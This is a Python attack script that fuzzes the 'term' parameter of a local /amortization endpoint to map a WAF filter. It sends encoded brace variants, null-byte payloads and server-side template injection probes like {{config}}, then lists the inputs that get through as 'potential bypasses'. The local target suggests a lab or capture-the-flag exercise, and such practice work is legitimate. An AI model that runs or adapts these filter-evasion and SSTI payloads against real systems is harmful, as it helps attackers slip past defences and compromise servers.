import requests
import urllib.parse
import time

# Target URL
target_url = "http://127.0.0.1:33207/amortization"

# Test payloads to map WAF filter behavior
# Format: (payload_name, payload, description)
test_payloads = [
    # Baseline tests
    ("baseline_normal", "1000", "Normal input without special characters"),
    ("baseline_special", "1000.50", "Normal input with decimal"),
    
    # Raw blocked patterns
    ("raw_open_brace", "{", "Raw open brace"),
    ("raw_close_brace", "}", "Raw close brace"),
    ("raw_both_braces", "{}", "Raw both braces"),
    ("raw_double_braces", "{{}}", "Raw double braces"),
    
    # URL encoding (single)
    ("url_open_brace", "%7B", "URL encoded open brace (uppercase)"),
    ("url_close_brace", "%7D", "URL encoded close brace (uppercase)"),
    ("url_open_brace_lower", "%7b", "URL encoded open brace (lowercase)"),
    ("url_close_brace_lower", "%7d", "URL encoded close brace (lowercase)"),
    ("url_both_braces", "%7B%7D", "URL encoded both braces"),
    
    # Double URL encoding
    ("double_url_open", "%257B", "Double URL encoded open brace"),
    ("double_url_close", "%257D", "Double URL encoded close brace"),
    ("double_url_both", "%257B%257D", "Double URL encoded both braces"),
    
    # HTML entity encoding (decimal)
    ("html_ent_open", "%26%23123%3B", "HTML entity open brace (&#123;)"),
    ("html_ent_close", "%26%23125%3B", "HTML entity close brace (&#125;)"),
    ("html_ent_both", "%26%23123%3B%26%23125%3B", "HTML entity both braces"),
    
    # HTML entity encoding (hex)
    ("html_hex_open_upper", "%26%23x7B%3B", "HTML hex entity open brace (&#x7B;)"),
    ("html_hex_open_lower", "%26%23x7b%3B", "HTML hex entity open brace lowercase (&#x7b;)"),
    ("html_hex_close_upper", "%26%23x7D%3B", "HTML hex entity close brace (&#x7D;)"),
    ("html_hex_close_lower", "%26%23x7d%3B", "HTML hex entity close brace lowercase (&#x7d;)"),
    ("html_hex_both", "%26%23x7B%3B%26%23x7D%3B", "HTML hex entity both braces"),
    
    # Null byte injection
    ("null_before_open", "%00%7B", "Null byte before open brace"),
    ("null_after_open", "%7B%00", "Null byte after open brace"),
    ("null_before_close", "%00%7D", "Null byte before close brace"),
    ("null_after_close", "%7D%00", "Null byte after close brace"),
    
    # Fragmentation techniques
    ("double_open", "%7B%7B", "Double open brace"),
    ("double_close", "%7D%7D", "Double close brace"),
    ("triple_open", "%7B%7B%7B", "Triple open brace"),
    ("triple_close", "%7D%7D%7D", "Triple close brace"),
    
    # Comment injection variations (URL encoded)
    ("comment_basic", "%7B%23%20%23%7D", "Basic comment {#{ }}"),
    ("comment_multiline", "%7B%23%0A%23%7D", "Multiline comment {#{\n#}}"),
    
    # SSTI-like patterns without braces
    ("ssti_dollar", "${7*7}", "Dollar sign template (no braces)"),
    ("ssti_percent", "%{7*7}", "Percent template (no braces)"),
    ("ssti_underscore", "_{7*7}", "Underscore template"),
    
    # Mixed encoding
    ("mixed_url_html", "%7B%26%23125%3B", "URL open + HTML entity close"),
    ("mixed_html_url", "%26%23123%3B%7D", "HTML entity open + URL close"),
    ("mixed_case", "%7b%7D", "Mixed case URL encoding"),
    
    # Common SSTI patterns with encodings
    ("ssti_7star7_raw", "{7*7}", "Simple SSTI 7*7"),
    ("ssti_7star7_url", "%7B7%2A7%7D", "URL encoded SSTI 7*7"),
    ("ssti_config_raw", "{{config}}", "Flask config"),
    ("ssti_config_url", "%7B%7Bconfig%7D%7D", "URL encoded Flask config"),
]

# Store results
results = []
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
})

print("=" * 80)
print("WAF FILTER MAPPING - /amortization?term= endpoint")
print("=" * 80)
print(f"Target: {target_url}")
print(f"Total test payloads: {len(test_payloads)}")
print("=" * 80)

# Run tests
for i, (payload_name, payload, description) in enumerate(test_payloads, 1):
    print(f"\n[{i}/{len(test_payloads)}] Testing: {payload_name}")
    print(f"Description: {description}")
    print(f"Payload: {payload}")
    
    try:
        # Send GET request with payload in term parameter
        params = {'term': payload}
        response = session.get(target_url, params=params, timeout=10)
        
        # Extract response data
        status_code = response.status_code
        response_text = response.text[:500] if len(response.text) > 500 else response.text
        
        # Determine if blocked
        blocked = status_code == 400
        
        print(f"Status: {status_code}")
        print(f"Blocked: {blocked}")
        print(f"Response preview: {response_text[:100]}...")
        
        # Store result
        results.append({
            'payload_name': payload_name,
            'payload': payload,
            'description': description,
            'status_code': status_code,
            'blocked': blocked,
            'response_preview': response_text
        })
        
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
        results.append({
            'payload_name': payload_name,
            'payload': payload,
            'description': description,
            'status_code': 'TIMEOUT',
            'blocked': None,
            'response_preview': 'TIMEOUT'
        })
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        results.append({
            'payload_name': payload_name,
            'payload': payload,
            'description': description,
            'status_code': 'ERROR',
            'blocked': None,
            'response_preview': str(e)
        })
    
    # Small delay to avoid rate limiting
    time.sleep(0.1)

# Generate summary report
print("\n" + "=" * 80)
print("WAF FILTER SUMMARY REPORT")
print("=" * 80)

# Count blocked vs allowed
blocked_count = sum(1 for r in results if r['blocked'] == True)
allowed_count = sum(1 for r in results if r['blocked'] == False)
unknown_count = sum(1 for r in results if r['blocked'] is None)

print(f"Total tests: {len(results)}")
print(f"Blocked (400): {blocked_count}")
print(f"Allowed (non-400): {allowed_count}")
print(f"Unknown/Error: {unknown_count}")
print("\n" + "=" * 80)

# Print blocked patterns
print("BLOCKED PATTERNS:")
print("=" * 80)
for result in results:
    if result['blocked'] == True:
        print(f"❌ {result['payload_name']:25} | Status: {result['status_code']} | {result['description']}")

print("\n" + "=" * 80)
print("ALLOWED PATTERNS:")
print("=" * 80)
for result in results:
    if result['blocked'] == False:
        print(f"✓ {result['payload_name']:25} | Status: {result['status_code']} | {result['description']}")

print("\n" + "=" * 80)
print("UNKNOWN/ERRORS:")
print("=" * 80)
for result in results:
    if result['blocked'] is None:
        print(f"? {result['payload_name']:25} | Status: {result['status_code']} | {result['description']}")

# Save detailed results for further analysis
print("\n" + "=" * 80)
print("DETAILED RESULTS BY CATEGORY")
print("=" * 80)

categories = {
    "Baseline": [r for r in results if r['payload_name'].startswith('baseline')],
    "Raw Braces": [r for r in results if r['payload_name'].startswith('raw')],
    "URL Encoding": [r for r in results if r['payload_name'].startswith('url')],
    "Double URL": [r for r in results if r['payload_name'].startswith('double_url')],
    "HTML Entity": [r for r in results if r['payload_name'].startswith('html_ent')],
    "HTML Hex": [r for r in results if r['payload_name'].startswith('html_hex')],
    "Null Byte": [r for r in results if r['payload_name'].startswith('null')],
    "Fragmentation": [r for r in results if r['payload_name'].startswith(('double_', 'triple_'))],
    "SSTI Patterns": [r for r in results if r['payload_name'].startswith(('ssti_', 'comment'))],
    "Mixed": [r for r in results if r['payload_name'].startswith('mixed')]
}

for category, category_results in categories.items():
    if category_results:
        print(f"\n{category}:")
        print("-" * 40)
        for r in category_results:
            status = "BLOCKED" if r['blocked'] else "ALLOWED"
            print(f"  {status:8} | {r['payload_name']:25} | {r['payload']}")

print("\n" + "=" * 80)
print("BYPASS RECOMMENDATIONS")
print("=" * 80)

# Identify potential bypass techniques
allowed_encodings = []
for result in results:
    if result['blocked'] == False and ('brace' in result['payload_name'] or '{' in result['payload'] or '}' in result['payload']):
        allowed_encodings.append(f"{result['payload_name']}: {result['payload']}")

if allowed_encodings:
    print("\n✓ POTENTIAL BYPASSES FOUND:")
    for enc in allowed_encodings:
        print(f"  - {enc}")
else:
    print("\n❌ No successful bypasses detected with current test set")
    print("  Recommend trying:")
    print("  - Unicode normalization bypasses")
    print("  - Backslash escaping")
    print("  - Alternative comment syntax")
    print("  - Case variations on HTML entities")

print("\n" + "=" * 80)
print("FILTER ANALYSIS COMPLETE")
print("=" * 80)
